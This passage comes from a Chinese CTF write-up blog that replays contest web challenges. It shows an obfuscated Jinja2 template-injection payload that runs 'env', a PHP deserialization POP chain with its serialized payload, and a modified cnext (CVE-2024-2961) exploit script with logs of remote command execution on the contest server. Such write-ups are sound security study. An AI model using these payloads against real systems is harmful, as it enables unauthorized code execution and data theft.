class="string">&#x27;t&#x27;</span>+<span class="string">&#x27;i&#x27;</span>+<span class="string">&#x27;t&#x27;</span>+<span class="string">&#x27;e&#x27;</span>+<span class="string">&#x27;m&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>))(<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;i&#x27;</span>+<span class="string">&#x27;m&#x27;</span>+<span class="string">&#x27;p&#x27;</span>+<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;r&#x27;</span>+<span class="string">&#x27;t&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>))(<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)|attr(<span class="string">&#x27;p&#x27;</span>+<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;p&#x27;</span>+<span class="string">&#x27;e&#x27;</span>+<span class="string">&#x27;n&#x27;</span>))(<span class="string">&#x27;e&#x27;</span>+<span class="string">&#x27;n&#x27;</span>+<span class="string">&#x27;v&#x27;</span>)|attr(<span class="string">&#x27;r&#x27;</span>+<span class="string">&#x27;e&#x27;</span>+<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;d&#x27;</span>))()%&#125;</span><br><span class="line">    hello! HOSTNAME=8f82eec3db4b4210</span><br><span class="line">    PYTHON_PIP_VERSION=<span class="number">20.1</span></span><br><span class="line">    HOME=/root</span><br><span class="line">    GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568</span><br><span class="line">    WERKZEUG_SERVER_FD=<span class="number">3</span></span><br><span class="line">    PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/1fe530e9e3d800be94e04f6428460fc4fb94f5a9/get-pip.py</span><br><span class="line">    PATH=/usr/local/<span class="built_in">bin</span>:/usr/local/sbin:/usr/local/<span class="built_in">bin</span>:/usr/sbin:/usr/<span class="built_in">bin</span>:/sbin:/<span class="built_in">bin</span></span><br><span class="line">    LANG=C.UTF-<span class="number">8</span></span><br><span class="line">    PYTHON_VERSION=<span class="number">3.8</span><span class="number">.2</span></span><br><span class="line">    PWD=/app</span><br><span class="line">    PYTHON_GET_PIP_SHA256=ce486cddac44e99496a702aa5c06c5028414ef48fdfd5242cd2fe559b13d4348</span><br><span class="line">    FLAG=NSSCTF&#123;f9f794c5-47f3-47b2-b473-<span class="number">488</span>1097d212f&#125;</span><br><span class="line"></span><br><span class="line">得到flag  </span><br><span class="line"></span><br><span class="line"><span class="comment">## 3.fileread  </span></span><br><span class="line"></span><br><span class="line">提示cnext  </span><br><span class="line"></span><br><span class="line">cnext是 PHP利用GNU C Iconv将文件读取变成RCE（CVE-<span class="number">2024</span>-<span class="number">2961</span>）</span><br><span class="line"></span><br><span class="line">GNU C 是一个标准的ISO C依赖库。在GNU C中，iconv()函数<span class="number">2.39</span>及以前存在一处缓冲区溢出漏洞，这可能会导致应用程序崩溃或覆盖相邻变量。</span><br><span class="line"></span><br><span class="line">如果一个PHP应用中存在任意文件读取漏洞，攻击者可以利用iconv()的这个CVE-<span class="number">2024</span>-<span class="number">2961</span>漏洞，将其提升为代码执行漏洞。</span><br><span class="line"></span><br><span class="line">先来看看反序列化</span><br><span class="line"></span><br><span class="line">源码：</span><br><span class="line"></span><br><span class="line">```PHP</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Smile</span> &#123;</span><br><span class="line">    public $hello = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    public $user = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    function show() &#123;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;user == <span class="string">&#x27;adm1n&#x27;</span>) &#123;</span><br><span class="line">            echo <span class="string">&#x27;Hello admin, here is your flag: &#x27;</span>.$this-&gt;hello-&gt;flag;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            echo <span class="string">&#x27;Hello &#x27;</span>.$this-&gt;user;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;show();</span><br><span class="line">    &#125;</span><br><span class="line">    function __invoke() &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^hello$/&#x27;</span>, $this-&gt;hello)) &#123;</span><br><span class="line">            echo <span class="string">&quot;flag就是那个在根目录下的flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Lucky</span> &#123;</span><br><span class="line">    public $chmod = <span class="string">&#x27;0700&#x27;</span>;</span><br><span class="line">    public $filename = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    function __wakeup() &#123;</span><br><span class="line">        $this-&gt;filename = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    function __toString() &#123;</span><br><span class="line">        echo <span class="string">&quot;Your File: &quot;</span>.file_get_contents($this-&gt;filename).<span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;huh?&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Happy</span> &#123;</span><br><span class="line">    public $func = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    public $param = [];</span><br><span class="line">    function call_func($func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!$this-&gt;param) &#123;</span><br><span class="line">            call_user_func(<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            call_user_func($func, <span class="string">&quot;locked&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function __get($var) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;func) &#123;</span><br><span class="line">            $this-&gt;call_func($this-&gt;func);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hacker!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Yeah($ser) &#123;</span><br><span class="line">    unserialize(base64_decode($ser));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@error_reporting(<span class="params"><span class="number">0</span></span>);</span></span><br><span class="line"><span class="keyword">if</span> (!empty($_GET)) &#123;</span><br><span class="line">    $param = $_GET[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line">    call_user_func(<span class="string">&quot;Yeah&quot;</span>, $param);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $face = new Smile();</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>pop链是__destruct()-&gt; __get -&gt; __invoke() -&gt; __toString()  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Smile</span>(<span class="keyword">new</span> <span class="title class_">Happy</span>(<span class="keyword">new</span> <span class="title class_">Smile</span>(<span class="keyword">new</span> <span class="title class_">Lucky</span>(<span class="string">&#x27;0700&#x27;</span>,<span class="string">&#x27;&#x27;</span>),<span class="string">&#x27;&#x27;</span>),<span class="string">&#x27;114&#x27;</span>),<span class="string">&#x27;adm1n&#x27;</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">//Tzo1OiJTbWlsZSI6Mjp7czo1OiJoZWxsbyI7Tzo1OiJIYXBweSI6Mjp7czo0OiJmdW5jIjtPOjU6IlNtaWxlIjoyOntzOjU6ImhlbGxvIjtPOjU6Ikx1Y2t5IjoyOntzOjU6ImNobW9kIjtzOjQ6IjA3MDAiO3M6ODoiZmlsZW5hbWUiO3M6MDoiIjt9czo0OiJ1c2VyIjtzOjA6IiI7fXM6NToicGFyYW0iO3M6MzoiMTE0Ijt9czo0OiJ1c2VyIjtzOjU6ImFkbTFuIjt9</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们使用可以自动利用cnext漏洞的脚本：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/ambionics/cnext-exploits">CNEXT exploits</a>  </p>
+</blockquote>
+<p>改下脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line"><span class="variable language_">self</span>.url = url</span><br><span class="line"><span class="variable language_">self</span>.session = Session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; Response:</span><br><span class="line"><span class="string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">self</span>.session.get(<span class="string">&quot;http://contest.ctf.nefu.edu.cn:33069/?</span></span><br><span class="line"><span class="string">p=Tzo1OiJTbWlsZSI6Mjp7czo1OiJoZWxsbyI7Tzo1OiJIYXBweSI6Mjp7czo0OiJmdW5jIjtPOjU6IlNt</span></span><br><span class="line"><span class="string">aWxlIjoyOntzOjU6ImhlbGxvIjtPOjU6Ikx1Y2t5IjoyOntzOjU6ImNobW9kIjtzOjQ6IjA3MDAiO3M6OD</span></span><br><span class="line"><span class="string">oiZmlsZW5hbWUiO3M6MDoiIjt9czo0OiJ1c2VyIjtzOjU6Imd1ZXN0Ijt9czo1OiJwYXJhbSI7czozOiIx</span></span><br><span class="line"><span class="string">MTEiO31zOjQ6InVzZXIiO3M6NToiYWRtMW4iO30=&quot;</span>, params=&#123;<span class="string">&quot;file&quot;</span>: path&#125;)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="string">&quot;&quot;&quot;Returns the contents of a remote file.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">path = <span class="string">f&quot;php://filter/convert.base64-encode/resource=<span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">response = <span class="variable language_">self</span>.send(path)</span><br><span class="line">data = response.re.search(<span class="string">&quot;Your File: (.*)\n\n&quot;</span>, flags=re.S).group(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> base64.decode(data)</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/cnext-exploits]</span><br><span class="line">└─$ python3 cnext-exploit.py http://contest.ctf.nefu.edu.cn:33100/ <span class="string">&#x27;ls -a / &gt; 1.txt&#x27;</span></span><br><span class="line">[*] The data:// wrapper works</span><br><span class="line">[*] The php://filter/ wrapper works</span><br><span class="line">[*] The zlib extension is enabled</span><br><span class="line">[+] Exploit preconditions are satisfied</span><br><span class="line">[*] Using 0x7fdfdb200040 as heap</span><br><span class="line"></span><br><span class="line">     EXPLOIT  SUCCESS </span><br></pre></td></tr></table></figure>
+
+<p>查看根目录</p>
+<pre><code>.
+..
+.dockerenv
+bin
+boot
+dev
+etc
+flag
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+readflag
+root
+run
+sbin
+srv
+start.sh
+sys
+tmp
+usr
+var
+</code></pre>
+<p>这里有readflag，听夏师傅说这里是SUID，所以直接运行readflag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/cnext-exploits]</span><br><span class="line">└─$ python3 cnext-exploit.py http://contest.ctf.nefu.edu.cn:33100/ <span class="string">&#x27;/./readflag &gt; 1.txt&#x27;</span> </span><br><span class="line">[*] The data:// wrapper works</span><br><span class="line">[*] The php://filter/ wrapper works</span><br><span class="line">[*] The zlib extension is enabled</span><br><span class="line">[+] Exploit preconditions are satisfied</span><br><span class="line">[*] Using 0x7fdfdb200040 as heap</span><br><span class="line"></span><br><span class="line">     EXPLOIT  SUCCESS </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://oight.github.io">Oight</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://oight.github.io/posts/2c44bf77/">http://oight.github.io/posts/2c44bf77/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://oight.github.io" target="_blank">Welcome！This is Oight！</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%91%A8%E6%8A%A5/">周报</a></div><div class="post-share"><div class="social-share" data-image="/img/1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/2471ba87/" title="渗透攻击学习"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">渗透攻击学习</div></div><div class="info-2"><div class="info-item-1"> 参考： 大学霸 Kali Linux 安全渗透教程  渗透测试是对用户信息安全措施积极评估的过程。通过系统化的操作和分析，积极发现系统和网络中存在的各种缺陷和弱点，如设计缺陷和技术缺陷。 ...</div></div></div></a><a class="pagination-related" href="/posts/6670da2/" title="淘汰赛"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">淘汰赛</div></div><div class="info-2"><div class="info-item-1">1.sign in&lt;?php error_reporting(0); include_once &#39;flag.php&#39;; if ($_SERVER[&#39;QUERY_STRING&#39;]) &#123;     if (preg_match(&quot;/[A-Za-z]+/&quot;, $_SERVER[&#39;QUERY_STRING&#39;])) &#123;         die(&quot;I hate English!&quot;);     &#125;     if (substr(md5($_POST[&#39;nsilab&#39;]), 0, 4) !== &quot;ba3f&quot; || $_GET[&#39;hi&#39;] !== &quot;web&quot;) &#123;         die(&quot;Oops! It&#39;s wrong!&quot;);     &#125;     if ($_COOKIE[&#39;user&#39;] !== &#39;admin&#39;)...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/d9660052/" title="DASCTF2024十月赛"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-04</div><div class="info-item-2">DASCTF2024十月赛</div></div><div class="info-2"><div class="info-item-1">WEBflow创建实例，提示： Welcome to My Flask App  This is a simple web app using Flask.    给出了任意文件读功能   看看 flask 应用的目录结构：   my_flask_app/ │ ├── app/ │   ├── __init__.py │   ├── routes/ │   │   ├── __init__.py │   │   ├── main.py │   │   └── auth.py │   ├── models/ │   │   ├── __init__.py │   │   └── user.py │   ├── templates/ │   │   ├── layout.html │   │   └── home.html │   └── static/ │       ├── css/ │       └── js/ │ ├── config.py ├── requirements.txt ├── migrations/ │   └── ... └── run.py ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Oight</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Oight"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Sign-in"><span class="toc-number">1.1.</span> <span class="toc-text">1.Sign in</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-ezssti"><span class="toc-number">1.2.</span> <span class="toc-text">2.ezssti</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/6a99cbbf/" title="RC4">RC4</a><time datetime="2025-03-29T08:08:40.000Z" title="发表于 2025-03-29 16:08:40">2025-03-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/2471ba87/" title="渗透攻击学习">渗透攻击学习</a><time datetime="2025-03-22T05:04:44.000Z" title="发表于 2025-03-22 13:04:44">2025-03-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/2c44bf77/" title="NSILAB淘汰赛复现">NSILAB淘汰赛复现</a><time datetime="2025-03-15T04:10:24.000Z" title="发表于 2025-03-15 12:10:24">2025-03-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/6670da2/" title="淘汰赛">淘汰赛</a><time datetime="2025-03-09T13:18:57.000Z" title="发表于 2025-03-09 21:18:57">2025-03-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/bba757cf/" title="原型链污染">原型链污染</a><time datetime="2025-03-05T12:37:44.000Z" title="发表于 2025-03-05 20:37:44">2025-03-05</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By Oight</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
